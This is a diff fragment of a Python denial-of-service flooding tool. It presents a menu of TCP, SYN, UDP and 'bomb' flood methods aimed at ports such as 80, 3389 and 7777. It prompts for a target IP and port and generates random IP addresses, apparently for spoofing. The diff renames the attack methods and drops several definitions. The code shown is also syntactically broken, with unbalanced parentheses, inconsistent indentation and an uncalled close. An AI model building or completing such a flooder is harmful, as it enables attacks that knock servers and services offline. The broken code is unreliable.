@@ -25,15 +25,14 @@ banner = """
 \033[91m|   TCP    | 80  | 3389 |
 \033[91m|   SYN    | 80  | 3389 |
 \033[91m|   UDP    |17091| 7777 |
-\033[91m| UDPBOMB  |17091| 7777 |
-\033[91m] TCPBOMB  | 80  | 3389 |
-\033[91m] TCPFLOOD | 80  | 3389 |
+\033[91m| UDP-BOMB |17091| 7777 |
+\033[91m] TCP-BOMBA| 80  | 3389 |
 \033[91m|----------|------------|
 """
 
 print(logo)
 print(banner)
-method = str(input("Method (TCP, TCPBOMB, TCPFLOOD, UDP, SYN, UDPBOMB) : "))
+method = str(input("Method (TCP, TCPBOMBA, UDP, SYN, UDPBOMB) : "))
 
 def UDP():
     ip = str(input("IP : "))
@@ -69,7 +68,7 @@ def TCP():
 
         s.sendto(data, addr)
         
- def TCPBOMB():
+def TCPBOMBA():
       
      ip = str(input("IP : ")))
      port = int(input("PORT : "))
@@ -89,7 +88,6 @@ def TCP():
               finally:
                 sock.close
      
-  def SYN
       
 def randproxy():
     ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
